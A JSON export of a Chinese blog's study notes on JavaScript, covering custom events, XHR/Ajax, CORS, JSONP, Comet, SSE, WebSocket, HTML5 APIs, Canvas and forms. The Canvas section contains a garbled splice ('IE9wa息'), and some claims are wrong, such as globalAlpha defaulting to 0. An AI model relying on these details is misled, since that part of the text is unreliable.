观察者模式由2类对象组成：主体和观察者。主体负责发布事件，同时观察者通过订阅这些时间来观察该主体。该模式的一个关键概念是主体并不知道观察者的任何事情，也就是说它一独立存在并正常运行即使没有观察者。从个另一方面，观察者知道主体并能注册事件的回调函数，涉及DOM时，DOM元素便是主体，事件处理代码就是观察者。 事件是与DOM交互的最常见方式，但也可以用非DOM代码，即通过实现自定义事件来交互。自定义事件背后的思想是创建一个管理事件的对象，让其他对象监听那些事件。12345678910111213141516171819202122232425262728293031323334353637function EventTarget()&#123; this.handlers = &#123;&#125;;&#125;EventTarget.prototype = &#123; constructor: EventTarget, addHandler: function(type, handler)&#123; if(typeof this.handlers[type] == 'undefined')&#123; this.handlers[type] = []; &#125; this.handlers[type].push(handler); &#125;, fire: function(event)&#123; if(!event.target)&#123; event.target = this; &#125; if(this.handlers[event.type] instanceof Array)&#123; var handlers = this.handlers[event.type]; for(var i = 0, len = handlers.length; i &lt; len; i++)&#123; handlers[i](event); &#125; &#125; &#125;, removeHandler: function(type, handler)&#123; if(this.handlers[type] instanceof Array)&#123; var handlers = this.handlers[type]; for(var i = 0, len = handlers.length; i &lt; len; i++)&#123; if(handlers[i] === handler)&#123; break; &#125; &#125; handlers.splice(i, 1); &#125; &#125;,&#125;;","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"}]},{"title":"JavaScript高级程序设计-24-Ajax和Comet","slug":"js-pro24","date":"2016-09-14T11:07:57.000Z","updated":"2017-12-06T14:50:09.352Z","comments":true,"path":"2016/09/14/js-pro24/","link":"","permalink":"https://github.com/xmoyKING/2016/09/14/js-pro24/","excerpt":"","text":"ajxa是基于XHR的，熟练使用XHR非常重要。 XMLHttpRequest对象IE7+以及其他浏览器都支持XHR1.0，XHR现在是2.0版本。通过new XMLHttpRequest()创建XHR对象，然后调用open方法指定要发起请求的类型（GET、POST），url，是否异步（true为异步，false为同步）。 然后调用send将要发送的数据传入即可，不传入数据时传入null，send执行后，发起请求后才会收到返回的status数据 xhr在创建后，其对象内有一个readyState属性用于表示当前请求过程的阶段： 0 为初始化、尚未调用xhr.open方法 1 启动，open执行，但send未执行 2 发生，send执行，但尚未收到响应 3 接收，收到部分数据 4 完成，接受到全部数据 每当readyState发生改变时，会触发readystatechange事件，此时可以对onreadystatechange事件进行监听（必须在open之前，而且只能使用DOM0级的方式）。123456xhr.onreadystatechange = function()&#123; // 此处没有event对象，返回的数据在xhr对象中 xhr.responseText; // 响应数据 xhr.responseXml; // xml格式的响应数据，必须是xml格式，若不是则为null xhr.status; // 状态码 xhr.statusText; // 状态名&#125;; 在send后，可以执行abort方法取消请求。因为xhr内存对象的问题，建议在停止请求后取消对xhr对象的引用。 HTTP头部信息每次发起xhr请求时都会同时将一些HTTP头部信息发送到服务器： Accept 浏览器能够处理的内容类型 Accept-Charset 浏览器能够显示的字符集 Accept-Encoding 浏览器能够处理的压缩编码 Accept-Language 浏览器当前的语言 Connection 浏览器当前与服务器之间链接的类型 Cookie 当前页面的Cookie Host 请求页面的域 Referer 请求页面的URL（HTTP规范拼写错误，正确的应该时referrer，但将错就错了） User-agent 浏览器用户代理字符串 使用setRequestHeader(headerName, value)可以设置自定义的请求头信息。getRequestHeader(‘headerName’)可以获取对应头部信息，getAllRequestHeaders可以获取所有的头部信息1xhr.setRequestHeader('MyHeader', 'value'); GET和POST请求当发起GET请求时，需要对查询字符串的每个值和键名用encodeURIComponent进行编码才能放到URL末尾，键值对之间用&amp;符号分割。 当发起POST请求时，默认情况下服务器对XHR请求和Web表单的请求不是一视同仁的，所以一般情况下为了兼容，除非特殊情况，否则对XHR请求伪装一下，模仿表单提交，将Content-Type头部设置为application/x-www-form-urlencoded, 其实Web的POST数据格式和查询字符串格式相同，所以可以用serialize方法将表单序列化然后传递给服务器。 XHR2.0XHR2级规范不是所有浏览器都实现了，但基本的内容都实现了。 XHR2级规范了FormData类型，为序列化表单以及创建与表单格式相同的数据提供遍历，XHR对象能自动识别传入的数据类型是FormData的实例，所以可以不必明确在XHR对象上设置头部。12345678var data = new FormData();data.append('name', 'value');// 也可以通过传入表单初始化数据var data = new FormData(document.forms[0])// 最后使用send发送即可xhr.send(data); XHR2.0规范添加了对timeout超时事件的处理，但只有IE8+支持。 进度W3C有一个Progress Events规范的草案，用于定义客户端服务器之间通信的进度事件。分为以下几种： loadstart 接收到响应数据第一个字节时触发 progress 接收响应期间不断触发 error 发生错误时触发 abort 因调用abort方法而终止时触发 load 接收完成时触发 loadend 通信结束触发（包括abort、load、error），目前没有浏览器支持 在onprogress事件处理过程中，event对象中有三个额外的属性： lengthComputable 表示进度信息是否可用的布尔值 position 表示已经接收到的字节数 totalSize 表示预期字节数（根据响应头部的Content-Length得出） 12345xhr.onprogress = function(event)&#123; if(event.lengthComputable)&#123; console.log('received'+ event.position + ' of ' + event.totalSize+ ' bytes!') &#125;&#125; 跨域资源共享CORS（Cross-Origin Resource Sharing）是W3C的一个草案，定义为在必须访问跨域资源时，浏览器与服务器应该如何沟通，CORS的基本思想是：使用自定义的HTTP头部让服务器和浏览器进行交互，从而决定请求或响应是否应该继续。 比如，一个请求（主体内容是text/plain）发送时浏览器会自动添加一个额外的Origin头部，表示此请求的页面的源信息（即协议、域名、端口，例如Origin: &#39;http://www.xxx.com&#39;），让服务器知道是谁发起的请求，然后确定是否给与响应,若服务器认为此请求是合法的则在响应中添加一个自定义头部信息，内容与Origin相同,Access-Control-Allow-Origin: &#39;http://www.xxx.com&#39;，浏览器会自动解析响应中的头部，若响应头部的Access-Control-Allow-Origin和请求的Origin不匹配则浏览器会忽略响应同时报错。 XHR标准原生支持跨域，但有一些限制： 不能使用setRequestHeader方法设置自定义头部 不带Cookie 调用getAllResponseHeaders方法返回空字符串 这样的限制是为了安全，尽量避免CSRF(Cross-Site Request Forgery 跨站请求伪造)和XSS(Cross-Site Scripting 跨站脚本)问题、 IE8+引入的XDR(XDomianRequest)类型部分实现了CORS规范，与XHR类似，但有一些不同： 只能是GET/POST 只能设置Content-Type字段 都是异步的，没有同步 出错时只能用onerror事件监听到 CORS虽然不能通过setRequestHeader方法设置自定义头部，但通过一个Preflighted Request（透明服务器验证机制）可以支持自定义头部、使用GET/POST之外的方法、不用类型的主体内容。使用时需要用到OPTION方法，除了Origin，同时会发送一些额外头部： Access-Control-Request-Method， 请求使用的方法 Access-Control-Request-Headers, 自定义的头部信息，多个则用逗号分隔 服务器接收到请求后也需要将上述的两个额外方法返回，同时会设置一个Access-Control-Max-Age用于表示此Preflight请求缓存时长 默认情况下CORS是不需要发生凭据的（例如Cookie、HTTP认证信息、SSL证明等都视为凭据）,但通过将withCredentials属性为true可以指定某个请求发生凭据（IE10-不支持），若服务器接收此带凭据的请求则响应中带有Access-Control-Allow-Crendentials:true。若服务器没有返回此头部则浏览器不会将响应交给请求事件。 其实，还有很多方式可以不依赖XHR对象，直接实现跨域请求，而且不用修改浏览器端代码。 图像Ping：img标签可以从任何地址加载图像，不用担心跨域的问题，这也是在线广告跟踪浏览量的主要方式，动态创建img标记，通过onload和onerror事件来确定是否接收到了响应。图像Ping是与服务器进行简单、单向的跨域通信的一种方式，请求的数据是通过查询字符串形式发送的，而响应可以是任意内容，但通常是像素图或204响应，通过图像Ping，浏览器得不到任何具体的数据，但通过监听load和error事件，能指定响应是什么时候接收到的。缺点是只能发生GET请求，而且无法访问服务器的响应文本，即只能用于简单的单向通信。12345var img = new Image();img.onload = function()&#123; // ...&#125;img.src = 'http://www.xx.com/test?name=value'; JSONP,填充式JSON/参数式JSON(JSON with Padding)，是应用JSON的一种方法，JSONP其实就是服务器返回一个包含在函数调用同时附带的参数为JSON格式。一般情况下，请求由2部分组成：url和回调函数名,其中回调函数名即响应数据中执行语句的函数名。JSONP是通过动态script元素来使用的，使用时为src指定一个跨域URL，因为script和img标签类似，都无视域的限制。缺点是想要知道请求是否成功比较麻烦，虽然能通过onerror事件，但其支持不足。1234567function responseCallBackFunc(res)&#123; // ...&#125;var script = document.createElement('script');script.src = 'http://www.xx.com/test/json?callback=responseCallBackFunc';document.body.insertBefore(script, document.body.firstChild); CometComet是Alex Russll发明的一个词，指的是一种使用Ajax的技术，与Ajax从页面向服务器请求数据不同，Comet是一种服务器向页面推送数据的技术，Comet基本上能达到实时推送，这类技术被称为“服务器推送技术”。 有两种Comet实现方式：*长轮询和HTTP流 长轮询是传统轮询（短轮询）的改版，即浏览器向服务器定时请求，看看有没有更新，优势是浏览器都支持，而且使用XHR对象和setTimeout即可实现。 短轮询，每次请求服务器立即返回，连接关闭，然后一段时后页面又请求 长轮询，每次请求服务器不立即返回，而是直到有数据才返回，连接关闭，页面处理完后立即再次请求长轮询与短轮询都需要在浏览器接收数据之前发起请求，而两者的主要区别是：服务器如何响应，短轮询是服务器立即响应，无论是否有效，而长轮询是等待发生响应。 HTTP流不同于轮询，因为它在页面的整个生命周期内只是用一次HTTP连接，具体就是浏览器向服务器发生一个请求，而服务器保存连接打开，然后周期性地向浏览器发生数据，即输出缓存然后刷新（将输出缓存中的内容一次性全部发生到客户端是后端语言都支持的）。浏览器通过XHR对象实现流，对readystatechange事件检测readyState的值，当readyState的值为3时则表示responseText属性接收到了所有的数据，此时比较以前接收到的数据即可知道从何处开始是新数据，当readyState为4则表示连接关闭。1234567891011121314var received = 0, xhr = new XMLHttpRequest();xhr.onreadystatechange = function()&#123; var result; if(xhr.readyState == 3)&#123; result = xhr.responseText.substring(received); received += result.length; // ... &#125;else if(xhr.readyState == 4)&#123; // ... &#125;&#125; 服务器推送技术有新的标准为Comet创建了2个新的接口（IE不支持） ：SSE（Server-Send Events 服务器推送事件）API用于创建到服务器的单向链接，服务器通过这个链接可以发生任意数据，服务器响应的MIME类型必须是text/event-stream，而浏览器中的js API能解析格式输出，SSE支持短轮询、长轮询、HTTP流，而且能在断开连接时自动重连。 SSE的API与其他消息API类似，先创建一个EventSource对象并传入一个连接地址，此地址必须要同源，然后监听EventSource对象的事件即可。EventSource有3个事件，open/message/error分别对应连接建立、收到响应数据、建立失败的情况。EventSource对象有一个readyState属性，当值为0表示正在连接、1表示打开连接成功、2表示关闭了连接。响应的数据保存在event.data中。最后可以调用close方法关闭连接而且不再自动重连。12345var source = new EventSource('xxx.php');source.onmessage = function(event)&#123; event.data; //&#125; 当响应的MIME类型为text/event-stream时，则表示此时为事件流，响应的格式是纯文本，且每个数据项都带有前缀data:,例如：123data: foodata: bardata: faa 则第一个message事件中event.data值为foo，第二个message事件中event.data值为bar，第三个message事件中event.data值为faa。通过id:前缀可给指定的事件指定一个关联ID，这个ID位于data:行前后都可，12data: fooid: 1 通过id，EventSource对象会自动跟踪上次触发的事件，主要用在断开时向服务器发生一个包含名为Last-Event-ID的特殊HTTP头部请求，告知服务器下一次触发那个事件，在多次连接的事件流中，这种机制可以确保浏览器以正确的顺序收到连接的数据段。 Web SocketsWeb Sockets的目标是在一个单独的持久链接上提供全双工、双向同学，在js创建Web Socket后会有一个HTTP请求发生到服务器，在取得服务器响应后，建立的连接会从HTTP变为Web Socket协议，因为标准的HTTP链接无法实现Web Sockets。 由于WebSockets使用自定义的协议，所以URL模式和普通连接不用，未加密的连接是ws://，加密的连接是wss://，自定义协议的好处是能够在客户端和服务器之间交换少量的数据，而不必担心HTTP字节的开销，WebSocket非常适合移动应用，因为传递的数据包很小。但缺点是协议制定周期太长。 WebSocket构造函数需要一个绝对地址，同时同源策略对其不适用，因此可以打开任何站点的链接，是否与某个域通信取决于服务器。在实例化Web Socket对象后浏览器会立即尝试创建链接，与XHR类似，有一个表示当前状态的readyState属性，但与XHR不同： WebSocket.OPENING，值为0，表示正在建立连接 WebSocket.OPEN，值为1，表示已经建立连接 WebSocket.CLOSING，值为2，表示正在关闭连接 WebSocket.CLOSE，值为3，表示已经关闭连接WebSocket的send方法用于发送数据（只能是文本数据），没有readystatechange事件，对应的是message事件，关闭连接为close方法，关闭后readyState值为2，成功关闭后为3。 WebSocket对象的还有3个事件对应连接生命周期的不同阶段触发： open，在成功建立时触发 error，发生错误时触发 close，在连接关闭时触发close事件中event对象有额外的信息，分别是： wasClean，布尔值，表示链接是否已经明确的关闭 code，服务器返回的数值状态码 reason，字符串，包含服务器发回的消息，一般用于记录日志或显示给用户 WebSocket不支持DOM2级事件监听，只支持DOM0级。12345678910var socket = new WebSocket('ws://www.xxx.com/server');socket.onclose = function(event)&#123; event.data;&#125;socket.send('&#123;name:king&#125;');socket.onmessage = function(event)&#123; event.data;&#125;socket.close(); SSE和WebSocket都能完成服务器推送的功能，如何选择需要考虑几个因数： 由于WS协议不同于HTTP，所以需要服务器支持该协议 是否需要双向通信，若只是读取服务器数据则SSE即可，但若需要双向通信则使用WS更好。而组合SSE和XHR也可以实现双向通信","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"ajax","slug":"ajax","permalink":"https://github.com/xmoyKING/tags/ajax/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"},{"name":"comet","slug":"comet","permalink":"https://github.com/xmoyKING/tags/comet/"},{"name":"web sockets","slug":"web-sockets","permalink":"https://github.com/xmoyKING/tags/web-sockets/"}]},{"title":"JavaScript高级程序设计-23-H5","slug":"js-pro23","date":"2016-09-11T01:54:45.000Z","updated":"2017-12-06T14:50:09.352Z","comments":true,"path":"2016/09/11/js-pro23/","link":"","permalink":"https://github.com/xmoyKING/2016/09/11/js-pro23/","excerpt":"","text":"为了简化创建动态Web界面的工作，H5规范定义了很多新HTML标记，同时也定义了很多API。 跨文档消息传递跨文档消息传递（cross-document messaging, XDM），指来自不同域的页面间传递消息，例如www.xxx.com页面同iframe中的sub.xxx.com通信（或者弹出的新页面），XDM将通信机制规范化，能稳妥简单的实现通信。 XDM的核心时postMessage方法，该方法除了在XDM中有，在其他部分也有可能会有，但都是为了通信，postMessage接收2个参数：消息(只能是字符串格式)，和表示消息接收方的域的字符串：12var iframeWin = document.getElementById('myframe').contentWindow;iframeWin.postMessage('hi', 'http://www.xxx.com'); 若将第二个参数设置为”*”,则表示把消息发给任何域，但不推荐。 接收到XDM消息时，会出发window对象的message事件，此事件是异步的，传给message事件的处理程序的事件对象包含3个重要的属性： data， 作为postMessage方法的第一个参数，即传递过来的数据 origin，发生消息的文档所在的域，主要用于验证身份 source，发生消息的文档的window对象的代理，除了postMessage方法通过此对象不能访问其他信息，因为它不是实际的对象123456EventUtil.addHandler(window,'message',function(event)&#123; if(event.origin == 'http://www.xxx.com')&#123; event.data; // 数据 event.source.postMessage('Received', 'http://sub.xxx.com'); &#125;&#125;) 原生拖放H5也为拖放制定了规范（由IE最先提出并实现），拖放能够在框架间、窗口间、甚至在应用间拖放网页元素。 拖放事件通过拖放事件，能控制拖放相关的各个方面，其中最关键的地方在于确定哪里发生了拖放事件，拖动某元素时，依次触发下列3个事件： dragstart,在被拖动元素上按下鼠标并开始移动时 drag，在元素被拖动期间持续触发，与mousemove类似 dragend，当拖动停止时触发 当某个元素被拖动到一个有效的放置目标上时（本身无效），会依次触发下列事件： dragenter，类似mouseover dragover，只要被拖动元素还在放置目标的范围内移动就会持续触发此事件 dragleave/drop，若被拖动元素离开放置目标的范围内则触发dragleave，若被拖动元素放到了放置目标上，则触发drog事件 自定义放置目标虽然所有元素都支持放置目标事件，但元素默认是不允许放置的，当拖动元素经过不允许放置的元素，则不会触发drop事件。只要重写dragenter和dragover事件在目标元素上的默认行为（即使用preventDefault阻止）即可将任何元素变成有效的放置目标。 dataTransfer对象拖放一般是需要实现数据交换的（否则单纯拖放没什么用），dataTransfer对象是事件对象event的一个属性，用于从被拖放元素想放置目标传递字符串格式的数据，因为它是event的属性，所以只能在拖放事件的事件处理函数中访问。 dataTransfer对象有2个主要方法：getData和setData，setData的2个参数分别为：数据类型，第二个参数为数据。getData只有一个参数即setData时的第一个参数。12345event.dataTransfer.setData('text', '...');event.dataTransfer.getData('text');event.dataTransfer.setData('text/uri-list', '...');event.dataTransfer.getData('text/uri-list'); 事实上，IE只有text和URL两种有效类型，而H5则扩展为MIME类型，考虑到向后兼容，H5会将text和URL分别映射为text/plain和text/uri-list类型。 同时，dataTransfer可以为每种MIME类型都保存一个值，即可以同时在对象中保持文本和URL。若在drop事件中没有读取到数据则说明dataTransfer对象已经被销毁，数据已丢失。 除了显式设置setData的内容，默认情况下，拖动文本时浏览器会自动调用setData方法，将文本以text格式保存起来，而链接和图片会以URL格式保持起来。 dropEffect与effectAlloweddataTransfer对象上有两个属性，dropEffect与effectAllowed，可以通过他们来确定被拖放元素以及作为放置目标的元素能够接收什么操作。 其中dropEffect属性可以知道被拖放的元素能够执行那种放置行为，其值为字符串类型，有4种可能值： ‘none’, 表示不能把拖动元素放在此处，所有元素的默认值（除了文本框之外） ‘move’, 表示应该把拖动元素移动到放置目标 ‘copy’, 表示应该把拖动元素复制到放置目标 ‘link’, 表示放置目标会打开被拖动元素（此时拖动元素必须是url）要使用dropEffect，必须在ondragenter事件中针对放置目标来设置它，同时必须搭配effectAllowed才行，effectAllowed表示允许拖动元素的哪种dropEffect。而effectAllowed必须在dragstart中设置。其值可以有如下几种： uninitialized， 没有设置任何放置行为 none copy move link copyLink，既可以copy也可以link copyMove linkMove all 默认情况下，只有文本、图片、链接可拖动，而其他元素不可拖动，H5为所有元素定义了一个draggable的属性，表示元素是否可拖动。该属性可更改默认设置。 dataTransfer还有如下3个属性： addElement(element), 为拖动操作添加一个元素，该元素只能影响数据，不影响外观 clearData(format) setDragImage(element, x, y), 指定拖动时光标下的元素（此元素可以是图片，或任意其他元素） types，当前保持的数据类型，返回一个类数组集合。 媒体元素H5新填了两个媒体元素，audio和video，分别用于嵌入音频和视频，允许通过js API自定义媒体控件。 不同的浏览器支持不同的编解码器，所有一般会指定多种格式的媒体来源。具体是否支持某个格式的媒体则可以通过canPlayType方法。 历史状态管理除了hashchange事件，H5更新了History对象，为管理历史状态提供了更多功能。 通过状态管理API，能够在不加在新页面的情况下修改浏览器URL，只要使用history.pushState方法即可，该方法接收3个参数：状态对象、新状态的标题、可选的相对URL1history.pushState(&#123;name: 'king'&#125;, 'King Page', 'king.html') 第一个参数用于提供还原（初始化）页面状态所需的各种信息，第三个参数在执行方法会变成新的URL，同时浏览器不会发生请求到服务器，即使状态修改后查询location也会返回更新后的地址。 pushState会创建新的历史状态加入到历史状态栈中，同时后退按钮也可使用，当后退时会触发window对象的popstate事件，该事件对象event有一个state属性，该属性就包含pushState时的第一个参数，状态对象。没有历史状态时state为null。 因为浏览器不会自动将页面重置为以前pushState时的状态，所以需要通过状态对象中的数据来还原页面的状态。 更新当前状态可以食堂replaceState方法，传入的参数与pushState的前2个参数相同，此方法不会在历史状态栈中创建新状态，只会重写当前的状态。 注：状态对象中不能包含DOM元素。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"html5","slug":"html5","permalink":"https://github.com/xmoyKING/tags/html5/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"}]},{"title":"JavaScript高级程序设计-22-Canvas","slug":"js-pro22","date":"2016-09-09T11:53:56.000Z","updated":"2017-12-06T14:50:09.352Z","comments":true,"path":"2016/09/09/js-pro22/","link":"","permalink":"https://github.com/xmoyKING/2016/09/09/js-pro22/","excerpt":"","text":"H5最受欢迎的可能时canvas元素了，这个元素负责在页面中设定一个区域，然后通过js动态地在这个区域绘制图形，canvas由几组API组成，目前支持该元素的浏览器（IE9wa息，若浏览器不支持canvas元素则备用信息会显示出来。 在canvas上绘画需要调用getContext()取得上下文，参数为上下文名，’2d’表示2D上下文对象。在使用canvas之前，一定要检测getContext是否存在（Firefox3会默认创建一个DOM对象，但没有getContext方法）。 使用toDataURL方法可以导出在canvas元素上绘制的图像，此方法接受一个参数，即图像的MIME类型，而且适合用于创建图像的任何上下文。123456789var drawing = document.getElementById('drawing');if(drawing.getContext)&#123; var context = drawing.getContext('2d'); // 获取一个png格式的图片 var imgURI = drawing.toDataURL('image/png'); // 默认png格式 var img = document.createElement('img'); img.src = imgURI; document.body.appenChild(img);&#125; 2D上下文使用2D绘制上下文提供的方法，可以绘制简单的2D图形，如矩形，弧线，路径等，2D上下文坐标开始于元素左上角，原点坐标为(0,0)。 填充和描边填充和描边时2D上下文的两种基本绘图操作，填充就是用指定的样式（颜色、渐变、图像）填充图形，描边就是只在图形的边缘画线。操作的结果取决于两个属性，fillStyle和strokeStyle。 这两个属性的值可以是字符串、渐变对象、模式对象。默认值为’#000000’。 对context设置这两种值则表示所有涉及的操作都将使用这两个样式，知道重新设置。 绘制矩形矩形时唯一一个可以直接在2D上下文绘制的形状，与矩形有关的方法包括fillRect、strokeRect、clearRect。这四个方法接收4个参数：x坐标，y坐标，宽，高，单位都是像素。 fillRect绘制一个可填充指定颜色的矩形，strokeRect可指定描边的颜色，clearRect用于清除矩形区域（本质上是将某一矩形区域变透明） 绘制路径通过路径可以创建很多复杂的形状和线条，从beginPath方法开始，在通过其他方法来实际绘制路径： arc(x, y, radius, startAngle, endAngle, counterclockwise), 以(x,y)为圆心绘制一条弧线 arcTo(x1,y2,x2,y2,radius),从上一点开始绘制一条弧线到(x2,y2)并以半径radius穿过(x1,y1) bezierCurveTo(c1x, c1y, c2x, c2y, x, y)，从上一点开始，到(x,y)为止，以(c1x, c1y)和(c2x, c2y)为控制点。 lineTo(x,y)，从上一点开始，到(x,y)为止 moveTo(x,y)，将绘制游标移动到(x,y)，不画线 quadraticCurveTo(cx,cy,x,y)，从上一点开始绘制一条二次曲线，到(x,y)为止，并且以(cx,cy)为控制点。 rect(x,y,width,height)，从(x,y)开始绘制一个矩形，宽高为width,height，此方法绘制的时矩形路径，而不是strokeRect和fillRect所绘制的独立形状。 若想绘制一条链接到路径起点的线条，可以调用closePath方法。若路径完成，则可以使用fill方法填充（依据fillStyle），或stroke方法描边，使用clip方法可以在路径上创建一个剪切区域。 isPointInPath方法接收一个坐标，用于在路径关闭之前确定某点是否在路径上。 绘制文本绘制文本也有2个方法，fillText、strokeText，都接收4个参数：文本字符串、x，y，可选最大像素宽度。同时可以设置3个属性： font，类比CSS中的font属性 textAlign，表示文本对齐方式 textBaseline, 表示文本的基线 由于文本绘制比较复杂，所以measureText方法能帮助控制文本的属性，接收一个表示字符串的参数，返回一个TextMetrics对象，该对象有一个width属性用于表示字符串的宽度。 变换2D上下文支持基本的绘制变换，创建绘制上下文时，会以默认值初始化变换矩阵，在默认的变换矩阵下，所有处理都按描述直接绘制。有如下变换矩阵： rotate(angle), 围绕原点旋转图像angle弧度 scale(scaleX,scaleY)，缩放图像，在x方向上乘以scaleX，默认为1.0 translate(x,y)，将原点移到(x,y) transform(m1_1, m1_2, m2_1, m2_2, dx, dy)， 直接修改变换矩阵 setTransform(m1_1, m1_2, m2_1, m2_2, dx, dy)， 将变换矩阵重置为默认状态，然后再调用transform方法。 save方法能给将所有的绘制上下文的设置和变换保存起来（入栈），对应的出栈方法为restore。 绘制图像通过drawImage方法能将图像绘制到画布上，该方法可以使用3种不同的参数组合： (HTML的img对象, x, y) (HTML的img对象, x, y, 图像宽, 图像高) (HTML的img对象, 源x, 源y, 源图像宽, 源图像高, 目标x, 目标y, 目标图像宽, 目标图像高) 通过toDataURL方法可以将图像导出为base64格式的数据。 阴影2D上下文能根据以下属性值自动为形状或路径绘制阴影。 shadowColor, 用CSS格式颜色表示的阴影颜色，默认黑色 shadowOffsetX，x轴方向上的阴影偏移量，默认为0 shadowOffsetY shadowBlur，模糊的像素数，默认0 渐变渐变由CanvasGradient实例表示，通过2D上下文创建或修改，调用createLinearGradient方法创建一个新的线性渐变，接收4个参数：起点x坐标，起点y坐标，终点x坐标，终点y坐标，该方法返回一个CanvasGradient实例。创建了渐变对象后，使用addColorStop方法来指定色标，参数为色标位置（0 - 1的数字）和CSS颜色值。 创建径向渐变（放射渐变）使用createRadialGradient方法，该方法接收6个参数：对应这两个圆的圆心和半径。可以将径向渐变想象成一个长圆桶，而这个6个参数指定的就是桶的2个圆形开口的位置，就可以达到像旋转圆锥体的效果，比如若两个圆为同心圆，则效果为一个向外扩散的径向渐变。 模式模式其实就是重复的图像，可以用来填充或描边图像，调用createPattern方法并传入2个参数：一个img/video/canvas元素和一个表示如何重复图像的字符串（同background-repeat属性值一样） 使用图像数据通过getImageData方法可以取得原始图像数据，参数为：x，y，宽，高。比如取得左上角（10, 5），50x50的图像数据context.getImageData(10,5,50,50),返回一个ImageData的实例，每个ImageData对象有3个属性，width、height、data，其中data是一个数组，保存着每个像素的数据（分别是：红、绿、蓝、透明度），操作这些图像数据可以实现很多功能。 合成还有2个属性是所有绘制操作都有的，globalAlpha用于指定所有绘制的透明度，默认0，最大1。 globalCompositionOperation属性表示绘制后的图形怎样与先绘制的图形结合，这个属性的值是字符串，具体是怎么样的效果最好通过实例查看。HTML 5 canvas globalCompositeOperation 属性","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"},{"name":"canvas","slug":"canvas","permalink":"https://github.com/xmoyKING/tags/canvas/"}]},{"title":"JavaScript高级程序设计-21-表单","slug":"js-pro21","date":"2016-09-04T08:57:13.000Z","updated":"2017-12-06T14:50:09.352Z","comments":true,"path":"2016/09/04/js-pro21/","link":"","permalink":"https://github.com/xmoyKING/2016/09/04/js-pro21/","excerpt":"","text":"js最初的应用就是分担服务器处理表单的责任，打破处处依赖服务器的局面。we表单没有为许多常见任务提供解决手段，所以一般需要在前端通过js增强表单功能，比如验证表单。 表单基础知识在HTML中，表单是由form元素表示的，js中对应的则是HTMLFormElement类型，HTMLFormElement类型继承自HTMLElement，与其他HTML有相同的默认属性，但其也有特殊的属性和方法： acceptCharset，服务器能够处理的字符集，等价于HTML中的accept-charset属性 action，请求的URL，等价于HTML中的action属性 elements，表单中所有控件的集合（HTMLCollection） enctype，请求的编码类型，等价于HTML中的enctype属性 length，表单中控件数量 method，要发生的HTTP请求类型，通常为GET/POST,等价于HTML的method属性 name，表单的名称，等价于HTML的name属性 reset(), 将所有表单域重置为默认值 submit(), 提交表单 target，用于发生请求和接收响应的窗口名，等价于HTML的target属性除了getElementById取得表单，可以先通过document.forms取得所有表单，然后再通过索引或name值来取得特定表单。12document.forms[0]; // 页面中第一个表单document.forms['formName']; // 页面中name为formName的表单 提交表单用户单击提交按钮或图像按钮时，就能提交表单，使用input/button元素都可以定义提交按钮，只要将type属性设置为submit即可，而图片按钮则可将type属性设置为image。 只要表单中存在任何上述的一种按钮，那么在相应表单空间拥有焦点的情况下，回车即可提交表单（textarea中回车会换行），若表单内没有提交按钮，则回车不会提交。 以此种方式提交表单时，浏览器在请求发生到服务器之前会触发submit事件，如此就能验证表单数据了，阻止submit事件可以取消表单提交。 通过js获取到表单对象后可以调用form.submit()方法，也能提交表单。此种方式无需表单包含提交按钮，在任何时候都能提交。但这种方式不会触发shubmit事件，所以，需要验证表单数据。 提交表单时很可能出现重复提交问题，解决此问题的办法：第一次提交后就禁用提交按钮，或，利用onsubmit事件处理程序取消后续的表单提交操作。 重置表单与submit一样，表单的重置也有好几种方式。 表单字段可以像访问页面中其他元素一样，使用原生DOM方法访问表单元素，此外，每个表单都有elements属性，该属性是表单所有元素的集合，这个elements集合是一个有序列表，其中包含着表单中所有字段（表单控件），每个表单字段在elements集合中的顺序与它们出现在HTML代码中的顺序相同，可以依索引和name属性来访问。 若多个表单空间都使用同一个name（如radio按钮），那么就会返回以该name命名的一个NodeList。 其实也可以通过表单控件的name属性来访问控件，但此种方式是为了与旧浏览器兼容，尽量使用elements的方式。 共有的表单字段属性除了fieldset元素外，所有表单字段都有相同的一组属性和方法：（input类型可以表示多种表单字段，有些属性仅适用于某些字段） disabled，布尔值，表示当前字段是否被禁用 form，指向当前字段所属表单的指针，只读 name，当前字段的名称 readOnly，布尔值，表示当前字段是否只读 tabIndex，表示当前字段的切换序号（tab的顺序） type，当前字段的类型，如radio、text等 value，当前字段提交给服务器的值，（对file类型来说是只读的，表示文件路径）除了form属性之外，可以通过js动态修改属性。12345var field = form.elements[0];field.value = 'king';field.focus(); // 聚焦到field字段上field.disabled = true; // 禁用当前字段field.type = 'checkbox'; // 对input元素可用，改变类型， 禁止重复提交可以在第一次提交表单后将按钮禁用掉，但需要注意，这种方式只能在submit事件内禁用，而不能在click事件内禁用，因为不同浏览器之间onclick和submit事件之间存在时差。 关于type属性，不同元素具有的type属性值不同，有些能动态修改有些无法修改 说明 HTML代码 type值 单选列表 &lt;select&gt; &lt;/select&gt; select-one, 只读 多选列表 &lt;select multiple&gt; &lt;/select&gt; select-multiple, 只读 按钮 &lt;button&gt; &lt;/button&gt; 默认submit,也可以显示设置 普通按钮 &lt;button type=&quot;button&quot;&gt; &lt;/button&gt; button 重置按钮 &lt;button type=&quot;reset&quot;&gt; &lt;/button&gt; reset 共有的表单字段方法每个表单字段都有两个方法，focus/blur,focus方法用于将浏览器的焦点设置到表单字段，即激活表单字段，使其可以响应键盘事件。 H5为表单字段新增了一个autofocus属性，在支持的浏览器中，不用js就能自动把焦点移动到相应字段。 与focus对应的blur方法是从元素上移走焦点，仅仅只是移走焦点，不会将焦点转移到其他控件上。 共有的表单字段事件所有表单字段都支持如下3个事件： blur， 